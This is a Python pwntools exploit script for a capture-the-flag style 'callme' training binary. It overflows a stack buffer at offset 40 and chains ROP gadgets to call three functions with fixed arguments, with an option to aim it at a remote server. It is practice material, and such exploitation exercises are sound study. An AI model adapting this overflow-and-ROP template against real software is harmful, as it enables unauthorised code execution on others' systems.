# ret2libc challenge

from pwn import *


# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify your GDB script here for debugging
gdbscript = '''
break pwnme
continue
'''.format(**locals())


# Set up pwntools for the correct architecture
exe = './callme'
#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# pwntools will get the context arch, bits, os and other useful parameters
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Offset to RIP, find manually with gdb
offset = 40

# Start program
io = start()

pop_all = p64(0x40093c)

pop_rdi = p64(0x4009a3)
pop_rsi_r15 = p64(0x4009a1)
pop_rdx = p64(0x40093e)
ret = p64(0x4006be)

deadbeef = p64(0xdeadbeefdeadbeef) 
cafebabe = p64(0xcafebabecafebabe)
doodfood = p64(0xd00df00dd00df00d)

junk = p64(0xFFFFFFFF)

callmeone = p64(0x400720)
callmetwo = p64(0x400740)
callmethree = p64(0x4006f0)


# Before returning into a function add a ret instruction or return further into the instruction.
# This challenge showed that if you use function calls already present in the binary it may fails as it could be followed by an exit instruction.
# The Procedure Linkage Table (PLT) is used to resolve function addresses in imported libraries at runtime. Calling them directly will prevent the previously mentioned issue.
payload = flat({
    offset: [
        pop_all,
        deadbeef,
        cafebabe,
        doodfood,
        ret,
        callmeone,
        pop_all,
        deadbeef,
        cafebabe,
        doodfood,
        ret,
        callmetwo,
        pop_all,
        deadbeef,
        cafebabe,
        doodfood,
        ret,
        callmethree,
        ret
    ]
})








io.sendlineafter(b'> ', payload)
io.recvline(10)


# Get Shell?
io.interactive()

